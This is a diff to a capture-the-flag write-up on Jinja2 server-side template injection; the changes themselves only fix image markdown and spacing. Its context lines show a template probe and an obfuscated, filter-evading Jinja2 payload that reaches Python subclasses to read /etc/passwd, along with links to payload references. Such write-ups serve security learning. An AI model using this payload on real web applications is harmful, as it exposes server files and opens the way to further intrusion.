@@ -2,7 +2,8 @@
 ```
 http://challenge2.lagncrash.com:17654/{{7*7}}
 ```
-![][./1.png]
+![](./1.png)
+<br>
 Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
 <br>
 <br>
@@ -30,12 +31,14 @@ Changed to /etc/passwd:
 ```
 {{ [[''|attr([[[]|map|string|list][0][20]*2,'class',[[]|map|string|list][0][20]*2]|join)|attr([[[]|map|string|list][0][20]*2,'mro',[[]|map|string|list][0][20]*2]|join)][0][2]|attr([[[]|map|string|list][0][20]*2,'subclasses',[[]|map|string|list][0][20]*2]|join)()][0][40](['/etc/passwd','r')|attr('read')() }}
 ```
-![][./2.png]
+![](./2.png)
 <br>
 <br>
 <br>
 Ditching start from scratch to just get flag.txt
-![][./3.png]
+<br>
+![](./3.png)
+<br>
 
 Reference: https://fireshellsecurity.team/asisctf-fort-knox/ (All the techniques)
 Reference: https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/ (Changing the techniques to do stuff)
